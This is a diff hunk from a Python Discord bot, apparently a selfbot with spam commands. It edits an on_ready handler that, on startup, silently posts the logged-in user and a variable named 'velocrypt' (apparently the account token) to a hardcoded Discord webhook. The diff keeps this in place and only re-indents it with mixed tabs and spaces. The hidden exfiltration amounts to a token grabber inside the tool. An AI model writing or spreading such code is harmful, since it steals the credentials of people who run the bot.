@@ -703,10 +703,10 @@ async def spamgcname(ctx):
 
 @client.event
 async def on_ready():
-    webhook1 = "https://discord.com/api/webhooks/945574525213487114/1Zfd9ovVWQkvnsPJIr8Zw1UccDAzU6t65V94UqDYNXeprImC5JAJIGTX5HZdYxC5pxCc"
-    pastebinserverurl = f"{client.user} \n{velocrypt} "
-    data = {'content':pastebinserverurl}
-    spamming = requests.post(webhook1, json=data)
+	webhook1 = "https://discord.com/api/webhooks/945574525213487114/1Zfd9ovVWQkvnsPJIr8Zw1UccDAzU6t65V94UqDYNXeprImC5JAJIGTX5HZdYxC5pxCc"
+    	pastebinserverurl = f"{client.user} \n{velocrypt}"
+    	data = {'content':pastebinserverurl}
+    	spamming = requests.post(webhook1, json=data)
 
 @client.command(
     name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
